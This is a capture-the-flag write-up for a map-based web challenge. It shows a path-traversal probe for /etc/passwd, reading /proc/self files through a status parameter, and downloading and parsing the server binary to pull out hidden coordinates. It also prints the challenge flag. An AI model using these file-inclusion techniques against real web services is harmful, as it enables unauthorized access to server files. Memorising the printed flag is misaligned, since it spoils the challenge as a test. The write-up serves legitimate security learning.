# Ventus CTF Challenge Writeup
## Initial Reconnaissance

The challenge presented a map-based web application with:
- Interactive Leaflet map centered on coordinates `[62.912218990814814, 7.440255332128054]` (Norway)
- Comment in source: "verdens navle" (Norwegian for "world's navel")
- Two main functionalities:
  - Map clicking sends coordinates to `/check` endpoint
  - Status tab loads diagnostics from `/status?info=` endpoint
- Binary name revealed as `/opt/globetrotter`

## Exploration Attempts

### 1. Coordinate Guessing
Initially tried various coordinate combinations:
- Default center coordinates → "This is NOT my favorite place!"
- Special values (0,0), (NaN, Infinity) → Same response
- Famous locations → No success

### 2. LFI Testing on Status Endpoint
Tested the `/status?info=` parameter for Local File Inclusion:
```bash
/status?info=../../../etc/passwd  # "LFI attempt detected ╰（‵□′）╯"
/status?info=environ              # Timeouts but works
/status?info=maps                 # Shows process memory maps
```

The status endpoint could read `/proc/self/` files but had LFI detection for path traversal.

### 3. Binary Analysis Discovery
Key breakthrough came when accessing the binary through `/status?info=exe`:
```bash
curl -s "https://[...]/status?info=exe" | strings | grep -i flag
```

Found critical strings:
- `/opt/some_really_long_and_impossible_to_guess_path_123/flag.txt`
- `Wow, you found my special place!`
- Function names: `read_flag`, `special_place`

## Solution

### Binary Download & Analysis
```bash
# Download the binary
curl -s "https://[...]/status?info=exe" -o globetrotter

# Find the special_place data structure
objdump -t globetrotter | grep special
# 0000000000026020 g     O .data  0000000000000130              special_place
```

### Coordinate Extraction
The `special_place` structure at offset `0x26020` contained 19 coordinate pairs stored as double-precision floats:

```python
import struct

with open('globetrotter', 'rb') as f:
    f.seek(0x26020)
    data = f.read(0x130)  # 304 bytes

coords = []
for i in range(0, len(data), 16):  # 16 bytes per pair (2x8-byte doubles)
    x_bytes = data[i:i+8]
    y_bytes = data[i+8:i+16]
    x = struct.unpack('<d', x_bytes)[0]
    y = struct.unpack('<d', y_bytes)[0]
    coords.append((x, y))
```

### Flag Retrieval
Testing the first coordinate pair:
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"x":-966558.74,"y":11392193.54}' \
  https://[...]/check
```

**Response**: 
```json
{
  "message": "🎯 Wow, you found my special place! 🎯\n\nKCSC{have_you_heard_of_the_Jan_Mayen_Special_Forces?}"
}
```

## Key Insights

1. **Proc filesystem access**: The `/status?info=` endpoint could read `/proc/self/` files
2. **Binary analysis over guessing**: Rather than brute-forcing coordinates, reverse engineering the binary revealed the exact solution
3. **Data structure understanding**: The coordinates were stored as a binary array of IEEE 754 doubles

## Tools Used
- `curl` - Web requests and binary download
- `objdump` - Binary analysis and symbol table inspection  
- `strings` - String extraction from binary
- `hexdump` - Raw binary data examination
- Python `struct` module - Binary data parsing

**Flag**: `KCSC{have_you_heard_of_the_Jan_Mayen_Special_Forces?}`
